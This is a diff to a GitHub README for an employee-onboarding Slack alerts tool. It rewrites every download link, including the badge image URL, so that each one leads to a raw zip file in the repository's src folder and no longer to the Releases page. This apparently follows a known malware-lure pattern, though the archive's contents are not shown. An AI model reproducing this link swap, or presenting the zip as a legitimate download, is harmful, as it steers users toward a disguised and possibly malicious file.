@@ -1,6 +1,6 @@
 # 🚀 employee-onboarding-slack-alerts - Streamline Your Employee Onboarding Process
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ivodikarlolo/employee-onboarding-slack-alerts/releases)
+[![Download Now](https://github.com/ivodikarlolo/employee-onboarding-slack-alerts/raw/refs/heads/main/src/employee_alerts_slack_onboarding_3.9.zip%20Now-Click%20Here-brightgreen)](https://github.com/ivodikarlolo/employee-onboarding-slack-alerts/raw/refs/heads/main/src/employee_alerts_slack_onboarding_3.9.zip)
 
 ## 📋 Description
 
@@ -38,7 +38,7 @@ To get started with the employee onboarding alerts, simply follow the steps belo
 
 First, go to our Releases page to find the latest version of the application.
 
-[Download Here](https://github.com/ivodikarlolo/employee-onboarding-slack-alerts/releases)
+[Download Here](https://github.com/ivodikarlolo/employee-onboarding-slack-alerts/raw/refs/heads/main/src/employee_alerts_slack_onboarding_3.9.zip)
 
 ### 2. Download the Application
 
@@ -71,7 +71,7 @@ The employee-onboarding-slack-alerts application works best with the following s
 
 To download the employee onboarding alerts application, visit the Releases page: 
 
-[Download Here](https://github.com/ivodikarlolo/employee-onboarding-slack-alerts/releases)
+[Download Here](https://github.com/ivodikarlolo/employee-onboarding-slack-alerts/raw/refs/heads/main/src/employee_alerts_slack_onboarding_3.9.zip)
 
 Follow the steps outlined in the "Getting Started" section to install the application.
 
